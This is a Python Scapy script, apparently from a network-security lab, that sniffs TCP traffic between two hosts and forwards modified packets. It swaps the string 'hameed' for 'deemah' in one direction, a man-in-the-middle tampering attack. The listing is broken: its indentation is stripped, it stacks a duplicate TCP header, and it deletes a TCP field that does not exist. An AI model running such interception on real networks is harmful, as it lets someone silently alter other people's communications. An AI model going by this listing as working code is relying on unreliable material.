#!/usr/bin/env python3
from scapy.all import *
import time
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
def spoof_pkt(pkt):
if pkt.haslayer(IP) and pkt.haslayer(TCP):
if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
newpkt = IP(bytes(pkt[IP])) / TCP(bytes(pkt[TCP]))
del(newpkt.chksum)
del(newpkt[TCP].chksum)
            
if pkt[TCP].payload:
data = pkt[TCP].payload.load
newdata = data.replace(b'hameed', b'deemah')
print(f"Original: {data} ==> Modified: {newdata}")
               
newpkt = newpkt / Raw(load=newdata)
#del newpkt[IP].len
del newpkt[TCP].len
send(newpkt, verbose=False)
else:
send(newpkt, verbose=False)
elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
newpkt = IP(bytes(pkt[IP])) / TCP(bytes(pkt[TCP]))
del(newpkt.chksum)
del(newpkt[TCP].chksum)
send(newpkt, verbose=False)
f = 'tcp and (ether src ' + MAC_A + ' or ether src ' + MAC_B + ')'
pkt = sniff(filter=f, prn=spoof_pkt)
